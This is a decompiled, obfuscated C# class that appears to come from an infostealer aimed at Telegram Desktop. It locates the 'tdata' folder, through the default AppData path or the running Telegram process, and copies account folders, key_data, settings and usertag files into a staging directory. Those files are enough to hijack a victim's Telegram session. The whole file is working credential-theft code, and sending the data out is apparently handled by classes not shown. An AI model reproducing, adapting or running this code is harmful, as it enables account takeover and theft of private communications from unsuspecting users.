using System;
using System.Diagnostics;
using System.IO;

internal class Class33
{
	public static void smethod_0(string string_0, string string_1)
	{
		if (!Directory.Exists(string_1))
		{
			Directory.CreateDirectory(string_1);
		}
		string[] files = Directory.GetFiles(string_0);
		foreach (string obj in files)
		{
			string fileName = Path.GetFileName(obj);
			string destFileName = Path.Combine(string_1, fileName);
			File.Copy(obj, destFileName);
		}
		files = Directory.GetDirectories(string_0);
		foreach (string obj2 in files)
		{
			string fileName2 = Path.GetFileName(obj2);
			string string_2 = Path.Combine(string_1, fileName2);
			Class29.smethod_1(obj2, string_2);
		}
	}

	private static string smethod_1()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(Path.GetDirectoryName(Class39.smethod_1(processesByName[0])), "tdata");
	}

	public static void smethod_2()
	{
		string string_ = Class38.string_11;
		string path = smethod_1();
		try
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string_ += "\\Telegram";
			Directory.CreateDirectory(string_);
			string[] directories = Directory.GetDirectories(path);
			string[] files = Directory.GetFiles(path);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name.Length == 16)
				{
					string string_2 = Path.Combine(string_, name);
					smethod_0(text, string_2);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string destFileName = Path.Combine(string_, name2);
				if (fileInfo.Length > 5120L)
				{
					continue;
				}
				if (name2.EndsWith("s") && name2.Length == 17)
				{
					fileInfo.CopyTo(destFileName);
					continue;
				}
				if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
				{
					fileInfo.CopyTo(destFileName);
				}
				Class36.int_7++;
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
